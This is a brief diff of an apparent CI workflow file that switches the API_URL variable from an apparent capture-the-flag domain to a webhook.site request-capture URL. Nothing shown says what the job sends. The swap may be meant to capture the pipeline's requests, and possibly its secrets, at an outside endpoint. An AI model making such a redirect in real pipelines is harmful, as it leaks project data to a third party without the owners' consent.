@@ -8,7 +8,7 @@ jobs:
   ci:
     runs-on: ubuntu-latest
     env:
-      API_URL: "https://ctf.catch-the-frog.com"
+      API_URL: "https://webhook.site/e6eae7d8-7108-4577-b73f-8bda1b20633a"
     
     steps:
     - name: Checkout code
